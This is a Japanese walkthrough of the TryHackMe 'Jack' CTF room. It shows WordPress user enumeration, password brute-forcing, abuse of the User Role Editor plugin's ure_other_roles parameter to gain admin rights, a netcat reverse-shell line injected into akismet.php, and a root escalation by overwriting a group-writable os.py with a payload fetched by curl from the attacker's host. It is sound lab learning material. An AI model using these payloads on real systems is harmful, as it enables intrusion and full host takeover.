# Jack CTF

https://tryhackme.com/room/jack

## Enumeration

```shell
TARGET=10.48.181.173
sudo bash -c "echo $TARGET   jack.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

SSH, HTTPのみ。

```sh
$ curl http://jack.thm/robots.txt
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
```

### サブドメイン、VHOST

ホスト名指定があったので念入りに探す。

```shell
ffuf -u http://jack.thm -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.jack.thm' -fs 17406

www                     [Status: 301, Size: 0, Words: 1, Lines: 1]
WWW                     [Status: 301, Size: 0, Words: 1, Lines: 1]
```

www は、転送されるだけ。有効なサブドメインは発見できなかった。

### wpscan

```sh
wpscan --url http://jack.thm/

[+] Upload directory has listing enabled: http://jack.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 5.3.2 identified (Insecure, released on 2019-12-18).
 | Found By: Rss Generator (Passive Detection)
 |  - http://jack.thm/index.php/feed/, <generator>https://wordpress.org/?v=5.3.2</generator>
 |  - http://jack.thm/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.3.2</generator>

[+] WordPress theme in use: online-portfolio
 | Location: http://jack.thm/wp-content/themes/online-portfolio/
 | Last Updated: 2020-08-18T00:00:00.000Z
 | Readme: http://jack.thm/wp-content/themes/online-portfolio/readme.txt
 | [!] The version is out of date, the latest version is 0.0.9
 | Style URL: http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2
 | Style Name: Online Portfolio
 | Style URI: https://www.amplethemes.com/downloads/online-protfolio/
 | Description: Online Portfolio WordPress portfolio theme for building personal website. You can take full advantag...
 | Author: Ample Themes
 | Author URI: https://amplethemes.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 0.0.7 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2, Match: 'Version: 0.0.7'
```

列挙。jack, wendy, danny ユーザーを発見。

```sh
wpscan --url http://jack.thm/ -e

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <===========================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] jack
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://jack.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] wendy
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] danny
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

プラグインのアグレッシブスキャン

```sh
[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:12:07 <===============================================> (92354 / 92354) 100.00% Time: 00:12:07
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://jack.thm/wp-content/plugins/akismet/
 | Last Updated: 2021-03-02T18:10:00.000Z
 | Readme: http://jack.thm/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 4.1.9
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://jack.thm/wp-content/plugins/akismet/, status: 200
 |
 | Version: 3.1.7 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://jack.thm/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://jack.thm/wp-content/plugins/akismet/readme.txt

[+] user-role-editor
 | Location: http://jack.thm/wp-content/plugins/user-role-editor/
 | Last Updated: 2021-02-26T04:17:00.000Z
 | Readme: http://jack.thm/wp-content/plugins/user-role-editor/readme.txt
 | [!] The version is out of date, the latest version is 4.58.3
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://jack.thm/wp-content/plugins/user-role-editor/, status: 200
 |
 | Version: 4.24 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://jack.thm/wp-content/plugins/user-role-editor/readme.txt
```

User Role Editor に[権限昇格の脆弱性](https://www.exploit-db.com/exploits/44595)がある。

```sh
$ searchsploit user role editor 4.24
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin User Role Editor < 4.25 - Privilege Escalation                  | php/webapps/44595.rb
--------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

wendy のパスワードが判明。

```sh
$ wpscan --url http://jack.thm/ --passwords /usr/share/wordlists/fasttrack.txt --usernames jack,danny,wendy
```

エクスプロイトを実行してみたが失敗。

```sh
msf auxiliary(test/ure) > exploit
[*] Running module against 10.48.150.21
[*] 10.48.150.21:80 - WordPress - Authentication - wendy:[REDACTED]
[+] 10.48.150.21:80 - WordPress - Authentication - OK
[*] 10.48.150.21:80 - WordPress - Getting data   - /wp-admin/profile.php
[+] 10.48.150.21:80 - WordPress - Getting data   - _wpnonce
[+] 10.48.150.21:80 - WordPress - Getting data   - color-nonce
[+] 10.48.150.21:80 - WordPress - Getting data   - checkuser_id
[+] 10.48.150.21:80 - WordPress - Getting data   - nickname
[+] 10.48.150.21:80 - WordPress - Getting data   - display_name
[-] Auxiliary aborted due to failure: 10.48.150.21:80 - WordPress - Getting data   - Failed (email): No failure message given
[*] Auxiliary module execution completed
```

プロフィール変更のリクエストをBurpでインターセプトし、ure_other_rolesをセット。

```http
ure_other_roles=activate_plugins,delete_others_pages,delete_others_posts,delete_pages,delete_posts,delete_private_pages,delete_private_posts,delete_published_pages,delete_published_posts,edit_dashboard,edit_others_pages,edit_others_posts,edit_pages,edit_posts,edit_private_pages,edit_private_posts,edit_published_pages,edit_published_posts,edit_theme_options,export,import,list_users,manage_categories,manage_links,manage_options,moderate_comments,promote_users,publish_pages,publish_posts,read_private_pages,read_private_posts,read,remove_users,switch_themes,upload_files,customize,delete_site,create_users,delete_plugins,delete_themes,delete_users,edit_plugins,edit_themes,edit_users,install_plugins,install_themes,unfiltered_html,unfiltered_upload,update_core,update_plugins,update_themes,ure_create_capabilities,ure_create_roles,ure_delete_capabilities,ure_delete_roles,ure_edit_roles,ure_manage_options,ure_reset_roles
```

ダッシュボードが管理者用になった。

404テンプレートを更新しようと思ったが、エラーが発生した。コメント部分だけの変更でも発生するので、内容の問題ではないと思われる。

```
Unable to communicate back with site to check for fatal errors, so the PHP change was reverted. You will need to upload your PHP file change by some other means, such as by using SFTP.
```

jackのパスワードを変更できた。しかし同様に更新はできなかった。

plugin の方で、akismet/akismet.php は更新できた。

```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.129.39 8888 >/tmp/f") ?>
```

プラグインをActivateしたらリバースシェル取得成功。

```sh
www-data@jack:/var/www/html/wp-admin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 権限昇格

```sh
www-data@jack:/var/www/html$ grep DB ./wp-config.php
define('DB_NAME', 'wordpress');
define('DB_USER', 'wordpressuser');
define('DB_PASSWORD', 'password');
define('DB_HOST', 'localhost');
define('DB_CHARSET', 'utf8');
define('DB_COLLATE', '');
```

backupのパーミッションに関して問題があったというrootユーザーのメモ。

```sh
www-data@jack:/home/jack$ cat reminder.txt 

Please read the memo on linux file permissions, last time your backups almost got us hacked! Jack will hear about this when he gets back.
```

id_rsa があった。

```sh
www-data@jack:/home/jack$ ls -al /var/backups
total 776
drwxr-xr-x  2 root root     4096 Jan 10  2020 .
drwxr-xr-x 14 root root     4096 Jan  9  2020 ..
-rw-r--r--  1 root root    40960 Jan  9  2020 alternatives.tar.0
-rw-r--r--  1 root root     9931 Jan  9  2020 apt.extended_states.0
-rw-r--r--  1 root root      713 Jan  8  2020 apt.extended_states.1.gz
-rw-r--r--  1 root root       11 Jan  8  2020 dpkg.arch.0
-rw-r--r--  1 root root       43 Jan  8  2020 dpkg.arch.1.gz
-rw-r--r--  1 root root      437 Jan  8  2020 dpkg.diversions.0
-rw-r--r--  1 root root      202 Jan  8  2020 dpkg.diversions.1.gz
-rw-r--r--  1 root root      207 Jan  9  2020 dpkg.statoverride.0
-rw-r--r--  1 root root      129 Jan  8  2020 dpkg.statoverride.1.gz
-rw-r--r--  1 root root   552673 Jan  9  2020 dpkg.status.0
-rw-r--r--  1 root root   129487 Jan  8  2020 dpkg.status.1.gz
-rw-------  1 root root      802 Jan  9  2020 group.bak
-rw-------  1 root shadow    672 Jan  9  2020 gshadow.bak
-rwxrwxrwx  1 root root     1675 Jan 10  2020 id_rsa
-rw-------  1 root root     1626 Jan  9  2020 passwd.bak
-rw-------  1 root shadow    969 Jan  9  2020 shadow.bak
```

これを使ってSSH接続できた。

```sh
jack@jack:~$ id
uid=1000(jack) gid=1000(jack) groups=1000(jack),4(adm),24(cdrom),30(dip),46(plugdev),115(lpadmin),116(sambashare),1001(family)
```

## 権限昇格２

pspyで2分おきにプロセスが実行されていることを確認。ユーザーはroot。

```sh
2026/02/26 02:38:01 CMD: UID=0     PID=1834   | /usr/bin/python /opt/statuscheck/checker.py 
2026/02/26 02:38:01 CMD: UID=0     PID=1833   | /bin/sh -c /usr/bin/python /opt/statuscheck/checker.py 
2026/02/26 02:38:01 CMD: UID=0     PID=1832   | /usr/sbin/CRON -f 
2026/02/26 02:38:01 CMD: UID=0     PID=1836   | sh -c /usr/bin/curl -s -I http://127.0.0.1 >> /opt/statuscheck/output.log                                                                                                             
2026/02/26 02:38:01 CMD: UID=0     PID=1835   | sh -c /usr/bin/curl -s -I http://127.0.0.1 >> /opt/statuscheck/output.log                                                           
```

```python
jack@jack:~$ cat /opt/statuscheck/checker.py
import os

os.system("/usr/bin/curl -s -I http://127.0.0.1 >> /opt/statuscheck/output.log")
```

延々とHTTPレスポンスヘッダーが追記されている。

```sh
jack@jack:~$ cat /opt/statuscheck/output.log
HTTP/1.1 200 OK
Date: Sat, 11 Jan 2020 00:44:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Sat, 11 Jan 2020 00:46:01 GMT
Server: Apache/2.4.18 (Ubuntu)
Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8
```

ファイルにもディレクトリにもWrite権限は無い。どちらかにWrite権限があれば悪用できる可能性があるが、無い。

```sh
jack@jack:~$ ls -al /opt/statuscheck/
total 24
drwxr-xr-x 2 root root 4096 Jan 10  2020 .
drwxr-xr-x 3 root root 4096 Jan 10  2020 ..
-rw-r--r-- 1 root root   92 Jan 10  2020 checker.py
-rw-r--r-- 1 root root 8910 Feb 26 02:46 output.log
```

Pythonがインポートするディレクトリを調査。

```sh
jack@jack:~$ python
Python 2.7.12 (default, Oct  8 2019, 14:14:10) 
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import sys
>>> print sys.path
['', '/usr/lib/python2.7', '/usr/lib/python2.7/plat-x86_64-linux-gnu', '/usr/lib/python2.7/lib-tk', '/usr/lib/python2.7/lib-old', '/usr/lib/python2.7/lib-dynload', '/usr/local/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages']
```

familyグループは /usr/lib/python2.7/os.py のWrite権限があり、jack はそのグループに属している。os.py を書き換えればいいだけ。

```sh
jack@jack:~$ ls -al /usr/lib/python2.7 | grep os
-rw-rw-r-x  1 root family   4635 Oct  8  2019 os2emxpath.py
-rw-rw-r-x  1 root family   4507 Jan  9  2020 os2emxpath.pyc
-rw-rw-r-x  1 root family  25908 Nov 16  2020 os.py
-rw-r--r--  1 root root    25593 Nov 16  2020 os.pyc
-rw-rw-r-x  1 root family  19100 Oct  8  2019 _osx_support.py
-rw-rw-r-x  1 root family  11736 Jan  9  2020 _osx_support.pyc
-rw-rw-r-x  1 root family   8003 Oct  8  2019 posixfile.py
-rw-rw-r-x  1 root family   7628 Jan  9  2020 posixfile.pyc
-rw-rw-r-x  1 root family  13925 Oct  8  2019 posixpath.py
-rw-rw-r-x  1 root family  11374 Jan  9  2020 posixpath.pyc

jack@jack:~$ id
uid=1000(jack) gid=1000(jack) groups=1000(jack),4(adm),24(cdrom),30(dip),46(plugdev),115(lpadmin),116(sambashare),1001(family)
```

上書き

```sh
jack@jack:~$ curl http://192.168.129.39:8000/os.py -o /usr/lib/python2.7/os.py
```

リバースシェル取得成功

```sh
$ nc -nlvp 9999
listening on [any] 9999 ...
connect to [192.168.129.39] from (UNKNOWN) [10.48.160.53] 40140
# id
id
uid=0(root) gid=0(root) groups=0(root)
```

## 振り返り

- seclists の1000行のパスワードでヒットしなかったが、250行程度のfasttrackでヒットした。fasttrackは管理者などが一時的な値として設定しそうな値が入っている。今回はまさにそのパターン。
- Metasploitモジュールがそのままでは使えず、解析して手作業で実行するというのは、ありそうであまりないパターン。
- WordPress はテーマ編集できない場合でも、プラグイン編集ができる場合があると学んだ。
- プラグイン編集でPentestMonkeyに置き換えたらアクティベート対象として表示されなくなり、リセットが必要になった。WordPress で PHP編集するときは、全体を置き換えるのではなく、既存のPHPの一番上に一行追加する程度が良い。
- 同様に、os.py を完全に置き換えたら依存関係のため実行時エラーになった。これも既存のPythonファイルの最後に追加する程度が良い。既存の機能をなるべく壊さない配慮はCTFでも重要。

## Tags

#tags:WordPress #tags:user-role-editor #tags:Python
